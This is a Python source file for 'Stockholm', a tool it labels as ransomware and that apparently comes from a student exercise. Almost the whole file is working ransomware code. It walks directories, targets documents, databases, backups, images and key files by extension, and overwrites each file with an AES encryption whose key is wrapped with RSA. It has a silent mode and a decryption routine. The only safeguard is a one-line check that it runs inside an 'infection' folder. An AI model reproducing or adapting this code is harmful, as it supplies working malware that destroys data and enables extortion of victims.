import argparse
import traceback
import sys
import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

BLUE = "\033[94m"
RED = "\033[91m"
GREEN = "\033[92m"
END = "\033[0m"

def print_info(state, msg):
    if not SILENT_MODE:
        print(BLUE + state + msg + END)

def target_files():
    ext_list = [".doc", ".docx", ".docb", ".docm", ".dot", ".dotm", ".dotx", ".xls", ".xlsx", ".xlsm", ".xlsb", ".xlw", ".xlt", ".xlm", ".xlc", ".xltx", ".xltm", ".ppt", ".pptx", ".pptm", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".pst", ".ost", ".msg", ".eml", ".edb", ".vsd", ".vsdx", ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".sldm", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".bz2", ".tbk", ".bak", ".tar", ".tgz", ".gz", ".7z", ".rar", ".zip", ".backup", ".iso", ".vcd", ".jpeg", ".jpg", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u", ".mid", ".wma", ".flv", ".3g2", ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".mp3", ".sh", ".class", ".jar", ".java", ".rb", ".asp", ".php", ".jsp", ".brd", ".sch", ".dch", ".dip", ".pl", ".vb", ".vbs", ".ps1", ".bat", ".cmd", ".js", ".asm", ".h", ".pas", ".cpp", ".c", ".cs", ".suo", ".sln", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".odb", ".dbf", ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", ".csr", ".crt", ".key", ".pfx", ".der"]
    final_list = []
    for dirpath, dirname, filename in os.walk(os.getcwd()):
        for file in filename:
            if file.endswith(tuple(ext_list)):
                final_list.append(os.path.join(dirpath, file))
    return final_list

# FOR TESTING PURPOSES

# def encrypt(files):
#     rsa_public_key = RSA.import_key(open("stockholm.pub").read())
#     cipher_rsa = PKCS1_OAEP.new(rsa_public_key)

#     aes_key = os.urandom(32)
#     cipher_aes = AES.new(aes_key, AES.MODE_EAX)
#     with open("/home/osboxes/infection/text.doc", "rb") as f:
#         data = f.read()
#     ciphertext, tag = cipher_aes.encrypt_and_digest(data)
#     encrypted_key = cipher_rsa.encrypt(aes_key)
#     with open("/home/osboxes/infection/text.doc", "wb") as f:
#         [f.write(x) for x in (encrypted_key, cipher_aes.nonce, tag, ciphertext)]
#     print_info("‚úÖ ", f"Successfully encrypted: /home/osboxes/infection/text.doc")
#     return 0

# def decrypt(reverse):
#     rsa_private_key = RSA.import_key(open(reverse).read())
#     cipher_rsa = PKCS1_OAEP.new(rsa_private_key)
#     with open("/home/osboxes/infection/text.doc", "rb") as f:
#         encrypted_key = f.read(rsa_private_key.size_in_bytes())
#         nonce = f.read(16)
#         tag = f.read(16)
#         ciphertext = f.read()
#     aes_key = cipher_rsa.decrypt(encrypted_key)
#     cipher_aes = AES.new(aes_key, AES.MODE_EAX, nonce)
#     data = cipher_aes.decrypt_and_verify(ciphertext, tag)
#     with open("/home/osboxes/infection/text.doc", "wb") as f:
#         f.write(data)
#     print_info("‚úÖ ", f"Successfully decrypted: /home/osboxes/infection/text.doc")
#     return 0

def encrypt(files):
    rsa_public_key = RSA.import_key(open("stockholm.pub").read())
    cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
    for file_path in files:
        aes_key = os.urandom(32)
        cipher_aes = AES.new(aes_key, AES.MODE_EAX)
        with open(file_path, "rb") as f:
            data = f.read()
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        encrypted_key = cipher_rsa.encrypt(aes_key)
        with open(file_path, "wb") as f:
            [f.write(x) for x in (encrypted_key, cipher_aes.nonce, tag, ciphertext)]
        print_info("‚úÖ ", f"Successfully encrypted: {file_path}")
    return 0

def decrypt(reverse):
    rsa_private_key = RSA.import_key(open(reverse).read())
    cipher_rsa = PKCS1_OAEP.new(rsa_private_key)
    files = target_files()
    for file_path in files:
        with open(file_path, "rb") as f:
            encrypted_key = f.read(rsa_private_key.size_in_bytes())
            nonce = f.read(16)
            tag = f.read(16)
            ciphertext = f.read()
        aes_key = cipher_rsa.decrypt(encrypted_key)
        cipher_aes = AES.new(aes_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
        with open(file_path, "wb") as f:
            f.write(data)
        print_info("‚úÖ ", f"Successfully decrypted: {file_path}")     
    return 0

def stockholm(reverse):
    if reverse:
        print_info("üîì ", "Reversing the encryption process with the given key: " + reverse)
        decrypt(reverse)
    else:
        print_info("üîê ", "Encrypting files")
        encrypt(target_files())

def main():
    global SILENT_MODE
    SILENT_MODE = False
    parser = argparse.ArgumentParser(prog="Stockholm - Malware ü¶†", description="Ransomware malware with encryption and decryption capabilities üîí", epilog="Developed by: https://github.com/fZpHr/ üë®‚Äçüíª")
    parser.add_argument("--version", "-v", required=False, action="store_true", help="Show version of the malware üìù")
    parser.add_argument("--reverse", "-r", required=False, type=str, metavar="üîë", help="Reverse the encryption process with the given üîë")
    parser.add_argument("--silent", "-s", required=False, action="store_true", help="Silent mode for the malware ü§´")
    args = parser.parse_args(sys.argv[1:])

    if args.version:
        print("Stockholm - Malware v1.0 ü¶†")

    if args.silent:
        SILENT_MODE = True
    infection_dir = os.path.join(os.getenv("HOME"), "infection")
    if not os.path.dirname(os.path.abspath(__file__)).startswith(infection_dir):
        print_info("üìÇ ", f"This tool only works in a folder called 'infection' in the user's HOME directory (current: {__file__})")
        return 1
    stockholm(args.reverse)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(RED + "Error: " + str(e) + END)
        traceback.print_exc()